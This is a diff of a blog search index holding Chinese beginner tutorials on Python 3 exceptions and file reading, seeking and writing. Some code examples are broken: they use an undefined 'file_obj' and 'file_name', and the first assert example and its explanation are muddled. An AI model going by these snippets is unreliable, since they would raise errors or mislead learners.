@@ -855,6 +855,130 @@
       </tags>
   </entry>
   <entry>
+    <title>Python3-异常</title>
+    <url>//44917d227716.html</url>
+    <content><![CDATA[<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>程序运行过程当中，不可避免的会出现一些错误</p>
+<p>这些错误在过程中，我们称之为异常</p>
+<h2 id="处理异常"><a href="#处理异常" class="headerlink" title="处理异常"></a>处理异常</h2><p>程序运行时出现异常，目的并不是让我们的程序直接终止<br>我们可以在出现异常时，编写代码对异常进行处理<br>避免因为一个异常导致程序的终止</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> 语句</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		代码块（可能出现错误的语句）</span><br><span class="line">	<span class="comment"># 如果except后不跟任何内容，会捕获所有的异常</span></span><br><span class="line">	<span class="comment"># 如果跟着异常的类型，只会捕获相关异常</span></span><br><span class="line">	<span class="comment"># 如果既想捕获所有异常，又想捕获某一异常，可以写多个except语句</span></span><br><span class="line">	<span class="comment"># Exception 是所有异常的父类，如果except后跟的是Exception，他也会捕获到所有的异常</span></span><br><span class="line">	<span class="keyword">except</span> 异常类型 <span class="keyword">as</span> 异常名:</span><br><span class="line">		代码块（出现错误以后的处理方式）</span><br><span class="line">	<span class="keyword">except</span> 异常类型 <span class="keyword">as</span> 异常名:</span><br><span class="line">		代码块（出现错误以后的处理方式）</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		代码块（没出现错误时执行的语句）</span><br><span class="line">	<span class="keyword">finally</span>:</span><br><span class="line">		代码块（无论是否有异常，该代码总会执行）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把异常用as的方式赋值给变量</span></span><br><span class="line"><span class="keyword">except</span> 异常 <span class="keyword">as</span> x</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="抛出异常"><a href="#抛出异常" class="headerlink" title="抛出异常"></a>抛出异常</h2><p>如果在函数中对异常进行处理，异常便不会影响程序<br>如果不对函数的异常进行处理，异常会传递到函数的调用处<br>出现异常后，所有异常信息会保存在一个专门保存异常的对象中<br>异常传播时，会调用这个保存异常的对象<br>比如 ：<br>    ZeroDivisionError类的对象专门用来表示除0的异常<br>    NameError类的对象专门用来处理变量错误的异常</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">可以使用 <span class="keyword">raise</span> 语句来抛出异常</span><br><span class="line"><span class="comment"># raise用于向外部抛出异常，后边可以跟一个异常类，或异常类的实例</span></span><br><span class="line"><span class="comment"># raise Exception</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a,b</span>):</span></span><br><span class="line">	<span class="keyword">if</span> a &lt; <span class="number">0</span> <span class="keyword">or</span> b &lt; <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">raise</span> Exception(<span class="string">&#x27;两个参数中不能有负数&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> a+b</span><br><span class="line"><span class="built_in">print</span>(add(-<span class="number">123</span>,<span class="number">456</span>))</span><br><span class="line"><span class="comment"># 也可以自定义异常类，只需要创建一个类继承Exception即可</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyError</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h2><p>一般用于对程序某个时刻必须满足的条件进行验证</p>
+<p>因为<code>assert</code>条件为<code>False</code>才会执行</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a,b</span>):</span></span><br><span class="line">	<span class="keyword">assert</span> a &lt; <span class="number">0</span> <span class="keyword">and</span> b &lt; <span class="number">0</span>,<span class="string">&quot;两个参数中不能有负数&quot;</span> </span><br><span class="line">	<span class="keyword">return</span> a+b</span><br><span class="line"><span class="built_in">print</span>(add(-<span class="number">123</span>,<span class="number">456</span>))</span><br><span class="line"><span class="comment"># 这里or是找True，所以不合适，应该使用and，找False</span></span><br><span class="line"><span class="comment"># a &lt; 0为True,所以不抛出异常,b&lt;0为False，所以抛出异常</span></span><br><span class="line">可以写成</span><br><span class="line"><span class="keyword">assert</span> a &gt; <span class="number">0</span> <span class="keyword">and</span> b &gt; <span class="number">0</span>,<span class="string">&quot;两个参数中不能有负数&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以用try语句控制</span></span><br><span class="line">a = -<span class="number">123</span></span><br><span class="line">b = <span class="number">456</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    add(a,b)</span><br><span class="line"><span class="keyword">except</span> AssertionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入有误：&quot;</span>, e)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(add(a,b))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="内置异常"><a href="#内置异常" class="headerlink" title="内置异常"></a>内置异常</h2><ul>
+<li>Exception：所有异常的父类<ul>
+<li>SystemExit：解释器请求退出</li>
+<li>KeyboardInterrupt：用户中断执行</li>
+<li>GeneratorExit：生成器发生异常来通知退出</li>
+<li>Exception：常规错误的父类<ul>
+<li>StopIteration：迭代器没有更多的值</li>
+<li>StopAsyncIteration：必须通过异步迭代器对象的__anext__()方法引发以停止迭代</li>
+<li>ArithmeticError：所有数值计算错误的基类<ul>
+<li>FloatingPointError：浮点数计算错误</li>
+<li>OverflowError：数值运算超出最大限制</li>
+<li>ZeroDivisionError：除(或取模)零所有数据类型</li>
+</ul>
+</li>
+<li>AssertionError：当<code>assert</code>语句判定<code>False</code>，断言失败</li>
+<li>AttributeError：对象中没有这个属性</li>
+<li>BufferError：与缓冲区相关的操作引发</li>
+<li>EOFError：没有内建输入，到达EOF标记</li>
+<li>ImportError：导入模块失败<ul>
+<li>ModuleNotFoundError：找不到模块</li>
+</ul>
+</li>
+<li>LookupError：无效数据查询<ul>
+<li>IndexError：序列中没有此索引</li>
+<li>KeyError：映射中没有这个键</li>
+</ul>
+</li>
+<li>MemoryError：内存溢出错误</li>
+<li>NameError：未声明，初始化对象<ul>
+<li>UnboundLocalError：访问未初始化的本地变量</li>
+</ul>
+</li>
+<li>OSError：操作系统错误<ul>
+<li>BlockingIOError：操作将阻塞对象设置为非阻塞操作</li>
+<li>ChildProcessError：子进程上的操作失败</li>
+<li>ConnectionError：与链接相关的异常<ul>
+<li>BrokenPipeError：在关闭写入的套接字上写入</li>
+<li>ConnectionAbortedError：链接被对方终止</li>
+<li>ConnectionRefusedError：链接被对方拒绝</li>
+<li>ConnectionResetError：链接被对方重置</li>
+</ul>
+</li>
+<li>FileExistsError：创建已存在的文件或者目录</li>
+<li>FileNotFoundError：请求文件或者目录不存在</li>
+<li>InterruptedError：系统调用被输入信号中断</li>
+<li>IsADirectoryError：在目录上请求文件</li>
+<li>NotADirectoryError：在不是目录事物上请求目录操作</li>
+<li>PermissionError：没有访问权限</li>
+<li>ProcessLookupError：进程不存在</li>
+<li>TimeoutError：系统函数在系统级别超时</li>
+</ul>
+</li>
+<li>ReferenceError：弱引用试图访问已经垃圾回收了的对象</li>
+<li>RuntimeError：一般的运行时错误<ul>
+<li>NotImplementedError：尚未实现的方法</li>
+<li>RecursionError：解释器检测到超出最大递归深度</li>
+</ul>
+</li>
+<li>SyntaxError：Python语法错误<ul>
+<li>IndentationError：缩进错误<ul>
+<li>TabError：Tab和空格混用</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SystemError：系统错误</li>
+<li>TypeError：类型错误</li>
+<li>ValueError：传入无效的参数<ul>
+<li>UnicodeError：Unicode 相关的错误<ul>
+<li>UnicodeDecodeError：Unicode 解码时的错误</li>
+<li>UnicodeEncodeError：Unicode 编码时错误</li>
+<li>UnicodeTranslateError：Unicode 转换时错误</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Warning：警告的错误<ul>
+<li>DeprecationWarning：关于被弃用的特征的警告</li>
+<li>PendingDeprecationWarning：关于构造将来语义会有改变的警告</li>
+<li>RuntimeWarning：可疑的运行行为的警告</li>
+<li>SyntaxWarning：可疑的语法的警告</li>
+<li>UserWarning：用户代码生成的警告</li>
+<li>FutureWarning：有关已弃用功能的警告的基类</li>
+<li>ImportWarning：模块导入时可能出错的警告的基类</li>
+<li>UnicodeWarning：与Unicode相关的警告的基类</li>
+<li>BytesWarning：bytes和bytearray相关的警告的基类</li>
+<li>ResourceWarning：与资源使用相关的警告的基类</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Python3</category>
+        <category>Python3基础</category>
+      </categories>
+      <tags>
+        <tag>Python3</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python3-数组</title>
     <url>//dff4ce1f2267.html</url>
     <content><![CDATA[<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ul>
@@ -990,120 +1114,137 @@
       </tags>
   </entry>
   <entry>
-    <title>Python3-异常</title>
-    <url>//44917d227716.html</url>
-    <content><![CDATA[<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>程序运行过程当中，不可避免的会出现一些错误</p>
-<p>这些错误在过程中，我们称之为异常</p>
-<h2 id="处理异常"><a href="#处理异常" class="headerlink" title="处理异常"></a>处理异常</h2><p>程序运行时出现异常，目的并不是让我们的程序直接终止<br>我们可以在出现异常时，编写代码对异常进行处理<br>避免因为一个异常导致程序的终止</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> 语句</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		代码块（可能出现错误的语句）</span><br><span class="line">	<span class="comment"># 如果except后不跟任何内容，会捕获所有的异常</span></span><br><span class="line">	<span class="comment"># 如果跟着异常的类型，只会捕获相关异常</span></span><br><span class="line">	<span class="comment"># 如果既想捕获所有异常，又想捕获某一异常，可以写多个except语句</span></span><br><span class="line">	<span class="comment"># Exception 是所有异常的父类，如果except后跟的是Exception，他也会捕获到所有的异常</span></span><br><span class="line">	<span class="keyword">except</span> 异常类型 <span class="keyword">as</span> 异常名:</span><br><span class="line">		代码块（出现错误以后的处理方式）</span><br><span class="line">	<span class="keyword">except</span> 异常类型 <span class="keyword">as</span> 异常名:</span><br><span class="line">		代码块（出现错误以后的处理方式）</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		代码块（没出现错误时执行的语句）</span><br><span class="line">	<span class="keyword">finally</span>:</span><br><span class="line">		代码块（无论是否有异常，该代码总会执行）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把异常用as的方式赋值给变量</span></span><br><span class="line"><span class="keyword">except</span> 异常 <span class="keyword">as</span> x</span><br></pre></td></tr></table></figure>
+    <title>Python3-文件与目录</title>
+    <url>//0571043783b3.html</url>
+    <content><![CDATA[<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>通过python程序对计算机中的各种文件进行增删改查等操作</p>
+<p>I/O (input/output)</p>
+<p>在windows系统使用路径时，可以使用<code>/</code>来代替 <code>\</code><br>或者可以使用 <code>\\ </code>来代替 <code>\</code><br>或者也可以使用原始字符串<code> r&#39;xxx&#39;</code><br>表示路径，可以使用<code>..</code>来返回一级目录</p>
+<h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(file, mode=<span class="string">&#x27;r&#x27;</span>, buffering=-<span class="number">1</span>, encoding_=<span class="literal">None</span>, errors=<span class="literal">None</span>, newline=<span class="literal">None</span>, closefd=<span class="literal">True</span>, opener=<span class="literal">None</span>)</span><br><span class="line">参数：</span><br><span class="line">	<span class="built_in">open</span>(file) 要打开的文件的名字（路径）</span><br><span class="line">返回值：</span><br><span class="line">	返回一个对象，这个对象就代表了当前打开的文件</span><br><span class="line">    </span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(a)</span><br><span class="line"><span class="built_in">print</span>(file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># with...as 语句</span></span><br><span class="line"><span class="comment"># 通过with语句，在处理文件时，不论是否抛出异常，都可以保证关闭已经打开的文件</span></span><br><span class="line"><span class="comment"># as后跟自定义变量</span></span><br><span class="line"><span class="comment"># 在with语句中可以直接使用file_obj来做文件操作</span></span><br><span class="line"><span class="comment"># 这个文件只能在with中使用，一旦with结束则文件会自动close()</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="built_in">print</span>(file.read())</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 调用open()来打开一个文件，可以将文件分成两种类型</span></span><br><span class="line"><span class="comment"># 一种，是纯文本文件（使用utf-8等编码编写的文本文件）</span></span><br><span class="line"><span class="comment"># 一种，是二进制文件（图片、mp3、ppt等这些文件）</span></span><br><span class="line"><span class="comment"># open()打开文件时，默认是以文本文件的形式打开的，但是open()默认的编码为None</span></span><br><span class="line"><span class="comment"># encodint可以设置指定文件的编码</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		<span class="built_in">print</span>(file.read())</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="抛出异常"><a href="#抛出异常" class="headerlink" title="抛出异常"></a>抛出异常</h2><p>如果在函数中对异常进行处理，异常便不会影响程序<br>如果不对函数的异常进行处理，异常会传递到函数的调用处<br>出现异常后，所有异常信息会保存在一个专门保存异常的对象中<br>异常传播时，会调用这个保存异常的对象<br>比如 ：<br>    ZeroDivisionError类的对象专门用来表示除0的异常<br>    NameError类的对象专门用来处理变量错误的异常</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">可以使用 <span class="keyword">raise</span> 语句来抛出异常</span><br><span class="line"><span class="comment"># raise用于向外部抛出异常，后边可以跟一个异常类，或异常类的实例</span></span><br><span class="line"><span class="comment"># raise Exception</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a,b</span>):</span></span><br><span class="line">	<span class="keyword">if</span> a &lt; <span class="number">0</span> <span class="keyword">or</span> b &lt; <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">raise</span> Exception(<span class="string">&#x27;两个参数中不能有负数&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> a+b</span><br><span class="line"><span class="built_in">print</span>(add(-<span class="number">123</span>,<span class="number">456</span>))</span><br><span class="line"><span class="comment"># 也可以自定义异常类，只需要创建一个类继承Exception即可</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyError</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<h2 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h2><p>一般用于对程序某个时刻必须满足的条件进行验证</p>
-<p>因为<code>assert</code>条件为<code>False</code>才会执行</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a,b</span>):</span></span><br><span class="line">	<span class="keyword">assert</span> a &lt; <span class="number">0</span> <span class="keyword">and</span> b &lt; <span class="number">0</span>,<span class="string">&quot;两个参数中不能有负数&quot;</span> </span><br><span class="line">	<span class="keyword">return</span> a+b</span><br><span class="line"><span class="built_in">print</span>(add(-<span class="number">123</span>,<span class="number">456</span>))</span><br><span class="line"><span class="comment"># 这里or是找True，所以不合适，应该使用and，找False</span></span><br><span class="line"><span class="comment"># a &lt; 0为True,所以不抛出异常,b&lt;0为False，所以抛出异常</span></span><br><span class="line">可以写成</span><br><span class="line"><span class="keyword">assert</span> a &gt; <span class="number">0</span> <span class="keyword">and</span> b &gt; <span class="number">0</span>,<span class="string">&quot;两个参数中不能有负数&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以用try语句控制</span></span><br><span class="line">a = -<span class="number">123</span></span><br><span class="line">b = <span class="number">456</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    add(a,b)</span><br><span class="line"><span class="keyword">except</span> AssertionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入有误：&quot;</span>, e)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(add(a,b))</span><br></pre></td></tr></table></figure>
+<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(a)</span><br><span class="line">b = file.read()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取大文件</span></span><br><span class="line"><span class="comment"># 如果要读取的文件较大的话，会一次性将文件的内容加载到内存中，容易导致内存泄漏</span></span><br><span class="line"><span class="comment"># 所以不能直接调用read()</span></span><br><span class="line"><span class="comment"># read()可以接收一个size作为参数，该参数用来指定要读取的字符的数量</span></span><br><span class="line"><span class="comment">#   默认值为-1，它会读取文件中的所有字符</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		content = file_obj.read(-<span class="number">1</span>)</span><br><span class="line">		content = file_obj.read(<span class="number">20</span>)</span><br><span class="line">		<span class="built_in">print</span>(content)</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">len</span>(content))</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 这个文件不存在！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取大文件方法二</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		<span class="comment"># 定义一个变量，来保存文件的内容</span></span><br><span class="line">        file_content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			content = file_obj.read(<span class="number">100</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> content:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="comment"># print(content,end=&#x27;&#x27;)</span></span><br><span class="line">			<span class="comment"># 利用拼串的方式分块读取内容</span></span><br><span class="line">			file_content += content</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 这个文件不存在！&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(file_content)</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="内置异常"><a href="#内置异常" class="headerlink" title="内置异常"></a>内置异常</h2><ul>
-<li>Exception：所有异常的父类<ul>
-<li>SystemExit：解释器请求退出</li>
-<li>KeyboardInterrupt：用户中断执行</li>
-<li>GeneratorExit：生成器发生异常来通知退出</li>
-<li>Exception：常规错误的父类<ul>
-<li>StopIteration：迭代器没有更多的值</li>
-<li>StopAsyncIteration：必须通过异步迭代器对象的__anext__()方法引发以停止迭代</li>
-<li>ArithmeticError：所有数值计算错误的基类<ul>
-<li>FloatingPointError：浮点数计算错误</li>
-<li>OverflowError：数值运算超出最大限制</li>
-<li>ZeroDivisionError：除(或取模)零所有数据类型</li>
+<h2 id="readline"><a href="#readline" class="headerlink" title="readline()"></a>readline()</h2><p>readline() 该方法可以用来读取一行内容<br>readlines()    该方法用于一行一行读取内容，会一次性把读取到的内容封装到列表中</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">import</span> pprint <span class="comment"># 当字符超过80字节时，用来美化输出</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">	<span class="built_in">print</span>(file.readline(),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="comment"># r = file.readlines()</span></span><br><span class="line">    <span class="comment"># pprint.pprint(r)</span></span><br><span class="line">    <span class="comment"># pprint.pprint(r[1])</span></span><br><span class="line"><span class="comment"># for循环也可以一行行读取数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file:</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="tell"><a href="#tell" class="headerlink" title="tell()"></a>tell()</h2><p><code>tell()</code>方法用来查看当前读取位置</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line"><span class="comment"># rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.read(<span class="number">130</span>))</span><br><span class="line">    <span class="comment"># 读取前130个字节</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.tell())</span><br><span class="line">    <span class="comment"># 返回当前读取的位置，返回的是字节位置，不是行数</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="seek"><a href="#seek" class="headerlink" title="seek()"></a>seek()</h2><p><code>seek()</code>用来修改当前读取的位</p>
+<p><code>seek()</code>需要两个参数，第一个是要切换到的位置，第二个是计算位置方式</p>
+<p>可选值：</p>
+<ul>
+<li>0： 从头计算，默认值</li>
+<li>1：从当前位置计算</li>
+<li>2：从最后位置开始计算</li>
 </ul>
-</li>
-<li>AssertionError：当<code>assert</code>语句判定<code>False</code>，断言失败</li>
-<li>AttributeError：对象中没有这个属性</li>
-<li>BufferError：与缓冲区相关的操作引发</li>
-<li>EOFError：没有内建输入，到达EOF标记</li>
-<li>ImportError：导入模块失败<ul>
-<li>ModuleNotFoundError：找不到模块</li>
-</ul>
-</li>
-<li>LookupError：无效数据查询<ul>
-<li>IndexError：序列中没有此索引</li>
-<li>KeyError：映射中没有这个键</li>
-</ul>
-</li>
-<li>MemoryError：内存溢出错误</li>
-<li>NameError：未声明，初始化对象<ul>
-<li>UnboundLocalError：访问未初始化的本地变量</li>
-</ul>
-</li>
-<li>OSError：操作系统错误<ul>
-<li>BlockingIOError：操作将阻塞对象设置为非阻塞操作</li>
-<li>ChildProcessError：子进程上的操作失败</li>
-<li>ConnectionError：与链接相关的异常<ul>
-<li>BrokenPipeError：在关闭写入的套接字上写入</li>
-<li>ConnectionAbortedError：链接被对方终止</li>
-<li>ConnectionRefusedError：链接被对方拒绝</li>
-<li>ConnectionResetError：链接被对方重置</li>
-</ul>
-</li>
-<li>FileExistsError：创建已存在的文件或者目录</li>
-<li>FileNotFoundError：请求文件或者目录不存在</li>
-<li>InterruptedError：系统调用被输入信号中断</li>
-<li>IsADirectoryError：在目录上请求文件</li>
-<li>NotADirectoryError：在不是目录事物上请求目录操作</li>
-<li>PermissionError：没有访问权限</li>
-<li>ProcessLookupError：进程不存在</li>
-<li>TimeoutError：系统函数在系统级别超时</li>
-</ul>
-</li>
-<li>ReferenceError：弱引用试图访问已经垃圾回收了的对象</li>
-<li>RuntimeError：一般的运行时错误<ul>
-<li>NotImplementedError：尚未实现的方法</li>
-<li>RecursionError：解释器检测到超出最大递归深度</li>
-</ul>
-</li>
-<li>SyntaxError：Python语法错误<ul>
-<li>IndentationError：缩进错误<ul>
-<li>TabError：Tab和空格混用</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>SystemError：系统错误</li>
-<li>TypeError：类型错误</li>
-<li>ValueError：传入无效的参数<ul>
-<li>UnicodeError：Unicode 相关的错误<ul>
-<li>UnicodeDecodeError：Unicode 解码时的错误</li>
-<li>UnicodeEncodeError：Unicode 编码时错误</li>
-<li>UnicodeTranslateError：Unicode 转换时错误</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Warning：警告的错误<ul>
-<li>DeprecationWarning：关于被弃用的特征的警告</li>
-<li>PendingDeprecationWarning：关于构造将来语义会有改变的警告</li>
-<li>RuntimeWarning：可疑的运行行为的警告</li>
-<li>SyntaxWarning：可疑的语法的警告</li>
-<li>UserWarning：用户代码生成的警告</li>
-<li>FutureWarning：有关已弃用功能的警告的基类</li>
-<li>ImportWarning：模块导入时可能出错的警告的基类</li>
-<li>UnicodeWarning：与Unicode相关的警告的基类</li>
-<li>BytesWarning：bytes和bytearray相关的警告的基类</li>
-<li>ResourceWarning：与资源使用相关的警告的基类</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line"><span class="comment"># 使用seek(x,2)的时候，用r+可能导致报错，推荐使用rb</span></span><br><span class="line"><span class="comment"># rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.read(<span class="number">130</span>))</span><br><span class="line">    <span class="comment"># 读取前130个字节</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.tell())</span><br><span class="line">    <span class="comment"># 返回当前读取的位置，返回的是字节位置，不是行数</span></span><br><span class="line">    file_obj.seek(<span class="number">50</span>)</span><br><span class="line">    <span class="comment"># 修改当前读取的位置为50字节</span></span><br><span class="line">    file_obj.seek(<span class="number">50</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 从50个字节起读取50个字节</span></span><br><span class="line">    file_obj.seek(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 读取最后一个之后的,会什么都读取不到</span></span><br><span class="line">    file_obj.seek(-<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 读取最后一个字节</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;当前读取的位置是:&#x27;</span>,file_obj.tell())</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h2><table>
+<thead>
+<tr>
+<th align="center">参数</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">t</td>
+<td align="center">文本模式（默认）</td>
+</tr>
+<tr>
+<td align="center">x</td>
+<td align="center">写模式，新建文件，如果该文件存在则报错</td>
+</tr>
+<tr>
+<td align="center">b</td>
+<td align="center">二进制模式</td>
+</tr>
+<tr>
+<td align="center">+</td>
+<td align="center">打开一个文件（可读可写）</td>
+</tr>
+<tr>
+<td align="center">U</td>
+<td align="center">通用换行模式（不推荐）</td>
+</tr>
+<tr>
+<td align="center">r</td>
+<td align="center">以只读方式打开文件（默认），文件不存在则报错</td>
+</tr>
+<tr>
+<td align="center">rb</td>
+<td align="center">以只读方式打开二进制文件（默认）</td>
+</tr>
+<tr>
+<td align="center">r+</td>
+<td align="center">以读写的方式打开一个文件</td>
+</tr>
+<tr>
+<td align="center">rb+</td>
+<td align="center">以读写的方式打开一个二进制文件</td>
+</tr>
+<tr>
+<td align="center">w</td>
+<td align="center">以只写的方式打开一个文件，如果文件存在则覆盖，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">wb</td>
+<td align="center">以只写的方式打开一个二进制文件，如果文件存在则覆盖，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">w+</td>
+<td align="center">以读写的方式打开一个文件，如果文件存在则覆盖，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">wb+</td>
+<td align="center">以读写的方式打开一个二进制文件，如果文件存在则覆盖，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">a</td>
+<td align="center">以追加的方式写入一个文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">ab</td>
+<td align="center">以追加的方式写入一个二进制文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">a+</td>
+<td align="center">以追加的方式读写一个文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">ab+</td>
+<td align="center">以追加的方式读写一个二进制文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
+</tr>
+</tbody></table>
